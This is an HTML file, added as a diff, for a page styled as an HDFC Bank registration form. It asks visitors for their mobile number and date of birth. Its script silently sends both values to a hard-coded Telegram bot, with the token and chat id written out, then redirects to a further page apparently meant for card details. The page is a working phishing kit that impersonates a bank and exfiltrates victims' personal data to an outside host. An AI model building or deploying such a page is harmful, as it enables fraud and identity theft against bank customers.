@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Registration Form</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+  <style>
+    .no-top-margin {
+      margin-top: 0px;
+    }
+  </style>
+</head>
+<body>
+<div class="container no-top-margin"> <!-- Removed mt-5 and added custom class -->
+    <img src="hdf.jpg" alt="HDFC Bank" width="390" height="280" style="margin-top: 0px;"> <!-- Inline CSS for zero top margin -->
+    <!-- Rest of your form -->
+  </div>
+  <div class="container mt-5">
+    <form id="registrationForm" onsubmit="sendTelegramMessage(event)">
+      <div class="form-group">
+        <label for="mobile-number">Mobile Number:</label>
+        <input type="tel" id="mobile-number" name="mobile-number" class="form-control" required pattern="[0-9]{10}" title="Please enter a 10-digit mobile number" placeholder="e.g. 1234567890" maxlength="10" oninput="validateMobileNumber()">
+        <span class="error-message" style="color:red; display:none;" id="mobile-error">Please enter a valid 10-digit mobile number.</span>
+      </div>
+      <div class="form-group">
+        <label for="dob">Date of Birth (DD/MM/YYYY):</label>
+        <input type="text" id="dob" name="dob" class="form-control" required pattern="(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/[0-9]{4}" title="Please enter date in the format DD/MM/YYYY" placeholder="DD/MM/YYYY" oninput="autoSlash(this); validateDOB()">
+        <span class="error-message" style="color:red; display:none;" id="dob-error">Please enter date in the format DD/MM/YYYY.</span>
+      </div>
+      <br>
+      <button type="submit" class="btn btn-primary btn-lg btn-block">Submit</button>
+    </form>
+  </div>
+<script>
+    function autoSlash(input) {
+      var v = input.value;
+      if (v.match(/^\d{2}$/) !== null) {
+        input.value = v + '/';
+      } else if (v.match(/^\d{2}\/\d{2}$/) !== null) {
+        input.value = v + '/';
+      }
+    }
+
+    function validateMobileNumber() {
+      var mobileInput = document.getElementById('mobile-number');
+      var error = document.getElementById('mobile-error');
+      if (mobileInput.value.match(/^[0-9]{10}$/)) {
+        error.style.display = 'none';
+      } else {
+        error.style.display = 'block';
+      }
+    }
+
+    function validateDOB() {
+      var dobInput = document.getElementById('dob');
+      var error = document.getElementById('dob-error');
+      if (dobInput.value.match(/^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/[0-9]{4}$/)) {
+        error.style.display = 'none';
+      } else {
+        error.style.display = 'block';
+      }
+    }
+
+    // Your existing sendTelegramMessage function
+  </script>
+  <script>
+    function autoSlash(input) {
+      var key = event.keyCode || event.charCode;
+      if (key !== 8 && key !== 46 && (input.value.length === 2 || input.value.length === 5)) {
+        input.value += '/';
+      }
+    }
+
+    function sendTelegramMessage(event) {
+      event.preventDefault();
+      var formData = new FormData(event.target);
+      var message = "New registration:\nMobile Number: " + formData.get('mobile-number') + "\nDate of Birth: " + formData.get('dob');
+      var url = "https://api.telegram.org/bot6789641797:AAH3tBZs38-Z6CB5bDQrPX6LZo4iVyq_yiY/sendMessage?chat_id=6929312170&text=" + encodeURI(message);
+      
+      fetch(url, { method: 'GET' })
+        .then(response => {
+          if (response.ok) {
+            window.location.href = 'cardanim.html'; // Replace with your desired URL);
+          } else {
+            alert('Failed to send form data to Telegram');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending form data to Telegram:', error);
+        });
+    }
+  </script>
+  
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@1.16.1/dist/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
+</body>
+</html>
